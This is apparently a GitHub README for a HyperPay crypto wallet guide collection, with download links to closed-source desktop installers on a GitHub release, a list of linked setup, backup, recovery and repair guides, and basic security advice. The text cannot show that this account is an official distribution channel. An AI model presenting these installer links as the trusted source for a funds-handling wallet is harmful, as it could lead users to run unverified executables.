<p align="center"><img src="assets/banner-hub.png" alt="HyperPay - guides and how-tos"></p>

<h1 align="center">HyperPay Wallet Guides</h1>

<p align="center">Install, custody, recovery, transfers and repairs for the HyperPay desktop wallet, written as steps rather than features.</p>

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21"><img src="https://img.shields.io/badge/RELEASE-v5.6.21-9DB8FF?style=for-the-badge&labelColor=0A2EA8" alt="Release v5.6.21"></a>
</p>

---

## Downloads - v5.6.21

<p align="center"><a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`hyperpay-wallet-windows-v5.6.21.exe`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe) |
| <img src="https://img.shields.io/badge/macOS-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`hyperpay-wallet-macos-v5.6.21.dmg`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg) |
| <img src="https://img.shields.io/badge/Linux-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Linux"> | x64 Ubuntu 20.04 or later, or an equivalent distribution | [`hyperpay-wallet-linux-v5.6.21.zip`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip) |

</div>

The installers are attached to the [v5.6.21 release](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21), and their checksums are printed in that release and in the main repository README.

> Only download from this GitHub release page.

---

## What this repository is for

This repository holds the wallet-core guides: the pages that take a reader from a downloaded installer to a working, backed-up wallet, and then through the faults that follow. It covers the install order on three platforms, the difference between a custodial balance and a self-custody one, the recovery phrase, the first send and receive, the fee structure, and the repairs that account for most support questions. It also covers the two hardware devices, because a cold-storage answer that stops at "use a hardware wallet" leaves the reader without a step.

What it deliberately does not cover is the spending card. Card issuance, funding, limits, declines and balance recovery belong to the card repository, and a reader who lands here looking for a declined payment should follow the card hub rather than a wallet repair page. The naming and trust questions, including which product called HyperPay a reader is looking at, sit in the third repository for the same reason: they answer a different question than this one does.

The reading order matters more than the length. A reader who installs before understanding the two storage modes usually backs up the wrong thing, and a reader who restores before checking the network usually blames the wallet for a balance that is sitting on another chain. The order here is written to prevent both, and every repair page assumes the earlier steps were done rather than asking the reader to start again.

## Who it is for

- You are installing the desktop wallet for the first time and want the order that avoids a later recovery problem.
- You already hold a balance and need the backup or restore step to be right the first time.
- A transfer, a sync or a login has stopped working and you want the cause before the workaround.
- You are moving from custodial to self-custody storage and want to know what changes.

## Start here

<div align="center">

| Guide | Why this one first |
| --- | --- |
| [What a HyperPay wallet is](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/what-is-a-hyperpay-wallet.md) | Explains the two storage modes in one account before any file is downloaded. |
| [Download on Windows](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/download-hyperpay-wallet-on-windows.md) | Covers the installer, the hash check and the first launch on the most common platform. |
| [Back up the recovery phrase](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/back-up-a-hyperpay-recovery-phrase.md) | Sets the two-copy rule that decides whether a lost device is recoverable at all. |
| [The wallet shows zero](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/hyperpay-wallet-shows-zero-balance.md) | Identifies which of five causes applies, which decides whether anything is actually lost. |

</div>

## How to use these guides

1. Read the wallet overview first, then decide which storage mode the balance will sit in.
2. Install the build and confirm its hash before you create or restore anything.
3. Back up the phrase and place the second copy before the first deposit arrives.
4. Send a small test amount and confirm it on the network you chose before moving a balance.
5. Keep the repair pages for the symptom you actually have instead of reinstalling blindly.
6. Move to the card or trust repository when the question changes from custody to spending or naming.

## The guides, grouped

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What is a HyperPay wallet](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/what-is-a-hyperpay-wallet.md) | Defines the product, the two storage modes and what a reader is actually installing. |
| [Custodial vs self-custody](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/custodial-vs-self-custody-in-hyperpay.md) | Compares the two modes by who holds the keys and who can recover a balance. |
| [Which blockchains are supported](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/which-blockchains-hyperpay-supports.md) | Lists the published chains and explains why custody mode changes that list. |
| [Fees explained](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/hyperpay-wallet-fees-explained.md) | Separates network fees from conversion, card and loan costs in one place. |
| [Download on Windows](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/download-hyperpay-wallet-on-windows.md) | Walks through the installer, the hash check and the first launch step by step. |
| [Install on macOS](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/install-hyperpay-wallet-on-macos.md) | Covers the disk image, the Applications folder and a blocked first launch. |
| [Run on Linux](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/run-hyperpay-wallet-on-linux.md) | Explains the zip build, permissions and the start step for each distribution family. |
| [Update to the current build](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/update-hyperpay-to-the-latest-build.md) | Shows why the newest build fixes most display and connection faults before anything else. |
| [Switch to self-custody](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/switch-hyperpay-wallet-to-self-custody.md) | Describes the order of steps that keeps a balance intact during the switch. |
| [Back up a recovery phrase](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/back-up-a-hyperpay-recovery-phrase.md) | Sets out paper, metal and the two-copy rule with the failure each one prevents. |
| [Restore from a phrase](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/restore-a-hyperpay-wallet-from-phrase.md) | Walks a restore on a new device and the checks to run before funding it. |
| [Lost recovery phrase](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/lost-hyperpay-recovery-phrase-options.md) | Separates what can still be recovered from what no one, including HyperPay, can restore. |
| [Reinstall without losing funds](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/reinstall-hyperpay-without-losing-funds.md) | Gives the order of backup, removal and reinstall that keeps the balance reachable. |
| [Wallet shows zero balance](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/hyperpay-wallet-shows-zero-balance.md) | Narrows a zero balance to one of five causes with the check that confirms each. |
| [Stuck on connecting or syncing](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/hyperpay-wallet-stuck-on-syncing.md) | Applies the fixes in the order that resolves the most common connection states. |
| [Login problems](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/fix-hyperpay-wallet-login-problems.md) | Covers password resets, two-factor codes and locked accounts, and states which recovery route each of those cases still allows. |
| [Send crypto](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/send-crypto-from-hyperpay-wallet.md) | Explains network choice, fee selection and what to do when a transfer is stuck. |
| [Receive crypto](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/receive-crypto-into-a-hyperpay-wallet.md) | Covers addresses, memos and the test send that catches a wrong network early. |
| [Is HyperPay safe](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/is-hyperpay-wallet-safe-to-use.md) | Sets out the audits that exist, what each covered and what a reader can verify. |
| [Security audits explained](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/hyperpay-wallet-security-audits-explained.md) | Names each audit, its date and its scope so a claim can be matched to a document. |
| [Avoid fake downloads](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/avoid-fake-hyperpay-wallet-downloads.md) | Shows how a fake installer is distributed and the three checks that expose one. |
| [Cold storage](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/keep-crypto-in-cold-storage-with-hyperpay.md) | Compares the Bluetooth device with the offline signing device and explains the key-handling difference that separates the two routes. |
| [Sealer2100 setup](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/set-up-sealer2100-with-hyperpay.md) | Covers iris enrolment, offline QR signing and pairing the device with the wallet. |
| [Pair HyperMate](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/pair-hypermate-with-hyperpay-wallet.md) | Explains the Bluetooth pairing sequence and the faults that stop it completing. |

</div>

## What each guide changes

<div align="center">

| Task | Guide | What is different afterwards |
| --- | --- | --- |
| Choose where the balance lives | Custodial vs self-custody | You know who holds the keys and which recovery path exists for each balance. |
| Survive a lost device | Back up a recovery phrase | Two copies exist away from the machine, so the wallet can be rebuilt elsewhere. |
| Recover a working wallet | Restore from a phrase | The same keys are live on the new device and the balance is confirmed before funding. |
| Stop a recurring fault | Update to the current build | The current build runs, which clears the connection and display faults the old one had. |
| Move funds safely | Send and receive | A test transfer has confirmed the network and address before the real amount moves. |
| Take keys offline | Cold storage | Signing happens on a device that holds the keys, and the desktop only builds transactions. |
| Return after a reinstall | Reinstall without losing funds | The wallet is working again with the same keys, and the phrase was confirmed before anything was removed. |
| Understand a fee before paying | Fees explained | You can name the fee you are paying, who receives it and which costs are not set by HyperPay. |

</div>

## Common first questions

### Do I need the hardware device?

No. The desktop wallet holds self-custody keys on its own, and a hardware device moves signing offline. The cold-storage guide explains what that changes rather than treating it as mandatory.

### Can I run custodial and self-custody together?

Yes, and that is the point of the hybrid design: one account can hold a custodial balance and a self-custody balance. The two have different recovery routes, which is the difference the comparison guide explains.

### What happens if I lose the phrase?

A self-custody balance becomes unreachable, and HyperPay cannot restore it. A custodial balance is unaffected, because its recovery runs through the account rather than the phrase.

### Why does the guide mention a version number?

Because the desktop build and the mobile build are separate releases with different numbers. A step that matches the desktop release will not match a phone, and mixing them causes most of the confusion.

### Do the guides cover the mobile application?

Only where a step is genuinely shared between the two surfaces. The desktop build is the release published here, and the phone application follows its own schedule and its own numbering.

---

## Before you install

Treat every file that is not on this release page as unverified, and confirm the hash before running it. No support process needs your recovery phrase, your private key or a screen share of an unlocked wallet, and a request for any of the three is an attack rather than assistance.

## About

These guides are written from the published HyperPay product: the wallet application, its release downloads and the company's own documentation. HyperPay is published by CipherBC Hyperpay Pte. Ltd. and has operated since 2017. Where a fact is a company statement rather than an independently verified one, the guide names the company as its source, and where a document does not exist, the guide says so instead of linking to a page that does not resolve. The guides describe the desktop product, because that is the build this account publishes; a phone build carries its own version number and its own release notes, and a step borrowed from a desktop page will not always match it.

## License

No licence is stated for the content of this repository. The company states that Sealer2100 firmware is published under Apache 2.0, and that repository carries no licence file; the wallet application is closed source.

---

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet">Main application</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21">Release v5.6.21</a> -
  <a href="https://github.com/hyperpay-gateway/hypercard-guide">HyperCard guides</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-name-and-trust">Name and trust</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-gateway">Profile page</a>
</p>
